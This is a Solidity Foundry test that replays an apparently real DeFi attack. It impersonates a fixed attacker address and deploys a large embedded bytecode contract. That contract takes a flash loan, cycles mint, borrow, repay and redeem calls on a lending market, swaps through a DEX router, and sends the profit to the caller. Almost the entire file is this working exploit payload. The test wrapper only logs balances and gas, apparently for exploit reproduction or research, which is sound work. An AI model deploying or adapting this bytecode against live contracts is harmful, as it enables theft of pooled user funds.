// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./PGNLZBase.sol";

contract ReplayTest is PGNLZBase {
    address constant ATTACKER_ADDR = 0xFE95ECc0795399662221AB48948CDcF3f6D4AA86;
    address constant TARGET_ADDR = 0x0000000000000000000000000000000000000000;
    bytes constant INPUT_DATA = hex"608060405234801561001057600080fd5b5060405161001d906100ad565b604051809103906000f080158015610039573d6000803e3d6000fd5b50600180546001600160a01b0319166001600160a01b0392909216918217905560408051631086538160e01b8152905163108653819160048082019260009290919082900301818387803b15801561009057600080fd5b505af11580156100a4573d6000803e3d6000fd5b505050506100ba565b61177f8061015983390190565b6091806100c86000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063c377dc8314602d575b600080fd5b600154603f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f3fea2646970667358221220692689868ebdca7a75549ab194ccee866bac13f5bb00f5e4d3d4a673564347ce64736f6c6343000814003360806040526a18d0bf423c03d8de00000060035534801561001f57600080fd5b50600080546001600160a01b0319163217905561173e806100416000396000f3fe6080604052600436106100435760003560e01c806301e336671461004f578063108653811461007157806313a1a562146100865780634782f779146100a657600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b5061006f61006a366004611309565b6100c6565b005b34801561007d57600080fd5b5061006f6101f7565b34801561009257600080fd5b5061006f6100a1366004611345565b610721565b3480156100b257600080fd5b5061006f6100c13660046113c1565b611276565b6000546001600160a01b031632146100f95760405162461bcd60e51b81526004016100f0906113eb565b60405180910390fd5b6040516370a0823160e01b815230600482015282906000906001600160a01b038316906370a0823190602401602060405180830381865afa158015610142573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610166919061142c565b90506001600160a01b03821663a9059cbb86612710610185878661145b565b61018f9190611478565b6040518363ffffffff1660e01b81526004016101ac92919061149a565b6020604051808303816000875af11580156101cb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ef91906114b3565b505050505050565b6000546001600160a01b031632146102215760405162461bcd60e51b81526004016100f0906113eb565b6040516370a0823160e01b8152738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c60048201527355d398326f99059ff775485246999027b3197955906370a0823190602401602060405180830381865afa158015610284573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102a8919061142c565b6002556040516370a0823160e01b8152738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c6004820152737130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c906370a0823190602401602060405180830381865afa15801561030e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610332919061142c565b600490815560405163095ea7b360e01b81527355d398326f99059ff775485246999027b31979559163095ea7b39161038491738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c91600019910161149a565b6020604051808303816000875af11580156103a3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103c791906114b3565b5060405163095ea7b360e01b81527355d398326f99059ff775485246999027b31979559063095ea7b3906104179073fd5840cd36d94d7229439859c0112a4185bc0255906000199060040161149a565b6020604051808303816000875af1158015610436573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061045a91906114b3565b5060405163095ea7b360e01b8152737130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c9063095ea7b3906104aa90738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c906000199060040161149a565b6020604051808303816000875af11580156104c9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ed91906114b3565b5060405163095ea7b360e01b8152737130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c9063095ea7b39061053d9073882c173bc7ff3b7786ca16dfed3dfffb9ee7847b906000199060040161149a565b6020604051808303816000875af115801561055c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061058091906114b3565b5060405163095ea7b360e01b815273882c173bc7ff3b7786ca16dfed3dfffb9ee7847b9063095ea7b3906105bc9083906000199060040161149a565b6020604051808303816000875af11580156105db573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ff91906114b3565b5060405163095ea7b360e01b815273fd5840cd36d94d7229439859c0112a4185bc02559063095ea7b39061063b9083906000199060040161149a565b6020604051808303816000875af115801561065a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061067e91906114b3565b506004546040805160016020820152738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c9263e0232b4292737130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c92016040516020818303038152906040526040518463ffffffff1660e01b81526004016106ed93929190611500565b600060405180830381600087803b15801561070757600080fd5b505af115801561071b573d6000803e3d6000fd5b50505050565b33738f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c146107745760405162461bcd60e51b815260206004820152600d60248201526c556e617574686f72697a65643160981b60448201526064016100f0565b6040516370a0823160e01b81523060048201527355d398326f99059ff775485246999027b3197955906370a0823190602401602060405180830381865afa1580156107c3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107e7919061142c565b60015560408051600280825260608201835260009260208301908036833701905050905073882c173bc7ff3b7786ca16dfed3dfffb9ee7847b816000815181106108335761083361155f565b60200260200101906001600160a01b031690816001600160a01b03168152505073fd5840cd36d94d7229439859c0112a4185bc02558160018151811061087b5761087b61155f565b6001600160a01b0390921660209283029190910190910152604051631853304760e31b815273fd36e2c2a6789db23113685031d7f163291583849063c2998238906108ca9084906004016115b9565b6000604051808303816000875af11580156108e9573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261091191908101906115cc565b506004805460405163140e25ad60e31b81529182015273882c173bc7ff3b7786ca16dfed3dfffb9ee7847b9063a0712d68906024016020604051808303816000875af1158015610965573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610989919061142c565b5060035460405163317afabb60e21b8152600481019190915273fd5840cd36d94d7229439859c0112a4185bc02559063c5ebeaec906024016020604051808303816000875af11580156109e0573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a04919061142c565b5060405163095ea7b360e01b81527355d398326f99059ff775485246999027b31979559063095ea7b390610a54907310ed43c718714eb63d5aa57b78b54704e256024e906000199060040161149a565b6020604051808303816000875af1158015610a73573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a9791906114b3565b5060405163095ea7b360e01b8152736b923cf1d592e6aa07ea7249d817a843c30ac69e9063095ea7b390610ae7907310ed43c718714eb63d5aa57b78b54704e256024e906000199060040161149a565b6020604051808303816000875af1158015610b06573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2a91906114b3565b506040516370a0823160e01b815232600482015273f909e413bc5c505dc89244345ff95ff3c811000d903090736b923cf1d592e6aa07ea7249d817a843c30ac69e906370a0823190602401602060405180830381865afa158015610b92573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bb6919061142c565b604051602401610bc792919061149a565b60408051601f198184030181529181526020820180516001600160e01b03166313c5035360e31b17905251610bfc919061168a565b6000604051808303816000865af19150503d8060008114610c39576040519150601f19603f3d011682016040523d82523d6000602084013e610c3e565b606091505b50506040516370a0823160e01b815230600482015260009150736b923cf1d592e6aa07ea7249d817a843c30ac69e906370a0823190602401602060405180830381865afa158015610c93573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610cb7919061142c565b6040516370a0823160e01b8152738cd8e57bcd00857bebe891a2349f32738cb7e65860048201529091506000906402540be4009068e5db63b83f5da149ad90736b923cf1d592e6aa07ea7249d817a843c30ac69e906370a0823190602401602060405180830381865afa158015610d32573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d56919061142c565b610d6091906116a6565b610d6a91906116a6565b60408051600280825260608201835292935060009290916020830190803683370190505090507355d398326f99059ff775485246999027b319795581600081518110610db857610db861155f565b60200260200101906001600160a01b031690816001600160a01b031681525050736b923cf1d592e6aa07ea7249d817a843c30ac69e81600181518110610e0057610e0061155f565b6001600160a01b0392909216602092830291909101909101526040516370a0823160e01b81523060048201527310ed43c718714eb63d5aa57b78b54704e256024e90638803dbee9084907355d398326f99059ff775485246999027b3197955906370a0823190602401602060405180830381865afa158015610e86573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610eaa919061142c565b8461dead610eb94260016116b9565b6040518663ffffffff1660e01b8152600401610ed99594939291906116cc565b6000604051808303816000875af1158015610ef8573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610f2091908101906115cc565b50604080516002808252606082018352600092602083019080368337019050509050736b923cf1d592e6aa07ea7249d817a843c30ac69e81600081518110610f6a57610f6a61155f565b60200260200101906001600160a01b031690816001600160a01b0316815250507355d398326f99059ff775485246999027b319795581600181518110610fb257610fb261155f565b6001600160a01b03909216602092830291909101909101527310ed43c718714eb63d5aa57b78b54704e256024e635c11d7958560008430610ff44260016116b9565b6040518663ffffffff1660e01b81526004016110149594939291906116cc565b600060405180830381600087803b15801561102e57600080fd5b505af1158015611042573d6000803e3d6000fd5b505060035460405163073a938160e11b8152600481019190915273fd5840cd36d94d7229439859c0112a4185bc02559250630e75270291506024016020604051808303816000875af115801561109c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110c0919061142c565b506004805460405163852a12e360e01b81529182015273882c173bc7ff3b7786ca16dfed3dfffb9ee7847b9063852a12e3906024016020604051808303816000875af1158015611114573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611138919061142c565b506040516370a0823160e01b81523060048201526000907355d398326f99059ff775485246999027b3197955906370a0823190602401602060405180830381865afa15801561118b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111af919061142c565b905060015481116111ee5760405162461bcd60e51b8152602060048201526009602482015268140cc819985a5b195960ba1b60448201526064016100f0565b60405163a9059cbb60e01b81527355d398326f99059ff775485246999027b31979559063a9059cbb90611227903290859060040161149a565b6020604051808303816000875af1158015611246573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061126a91906114b3565b50505050505050505050565b6000546001600160a01b031632146112a05760405162461bcd60e51b81526004016100f0906113eb565b476001600160a01b0383166108fc6127106112bb858561145b565b6112c59190611478565b6040518115909202916000818181858888f1935050505015801561071b573d6000803e3d6000fd5b80356001600160a01b038116811461130457600080fd5b919050565b60008060006060848603121561131e57600080fd5b611327846112ed565b9250611335602085016112ed565b9150604084013590509250925092565b60008060006040848603121561135a57600080fd5b83359250602084013567ffffffffffffffff8082111561137957600080fd5b818601915086601f83011261138d57600080fd5b81358181111561139c57600080fd5b8760208285010111156113ae57600080fd5b6020830194508093505050509250925092565b600080604083850312156113d457600080fd5b6113dd836112ed565b946020939093013593505050565b60208082526021908201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6040820152603760f91b606082015260800190565b60006020828403121561143e57600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b808202811582820484141761147257611472611445565b92915050565b60008261149557634e487b7160e01b600052601260045260246000fd5b500490565b6001600160a01b03929092168252602082015260400190565b6000602082840312156114c557600080fd5b815180151581146114d557600080fd5b9392505050565b60005b838110156114f75781810151838201526020016114df565b50506000910152565b60018060a01b038416815282602082015260606040820152600082518060608401526115338160808501602087016114dc565b601f01601f191691909101608001949350505050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b838110156115ae5781516001600160a01b031687529582019590820190600101611589565b509495945050505050565b6020815260006114d56020830184611575565b600060208083850312156115df57600080fd5b825167ffffffffffffffff808211156115f757600080fd5b818501915085601f83011261160b57600080fd5b81518181111561161d5761161d611549565b8060051b604051601f19603f8301168101818110858211171561164257611642611549565b60405291825284820192508381018501918883111561166057600080fd5b938501935b8285101561167e57845184529385019392850192611665565b98975050505050505050565b6000825161169c8184602087016114dc565b9190910192915050565b8181038181111561147257611472611445565b8082018082111561147257611472611445565b85815284602082015260a0604082015260006116eb60a0830186611575565b6001600160a01b039490941660608301525060800152939250505056fea2646970667358221220fddd092a01aa9db64478c108e517466d6350d9f0d6fd8600abae396b891487d164736f6c63430008140033";

    function testReplay() public {
        beneficiary = ATTACKER_ADDR;
        if (fundingToken == address(0)) vm.deal(address(this), 0);
        _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
        
        uint256 gasBefore = gasleft();
        try this._executeReplay() {
            uint256 gasUsed = gasBefore - gasleft();
            (string memory symbol, uint256 balance, uint8 decimals) = _getTokenData(fundingToken, beneficiary);
            _logTokenBalance(fundingToken, beneficiary, "[REPLAY] After");
            _writeExecutionResult("REPLAY", gasUsed, balance, symbol, decimals);
        } catch Error(string memory reason) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", reason, gasUsed);
            emit log_string(string(abi.encodePacked("[REPLAY] Reverted: ", reason)));
            revert(reason);
        } catch (bytes memory) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", "Low-level revert", gasUsed);
            emit log_string("[REPLAY] Low-level revert");
            revert("Low-level revert");
        }
    }

    function _executeReplay() external {
        vm.startPrank(ATTACKER_ADDR);
        (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
        if (!success) {
            if (returnData.length > 0) {
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
            revert("Replay failed");
        }
        vm.stopPrank();
    }
}
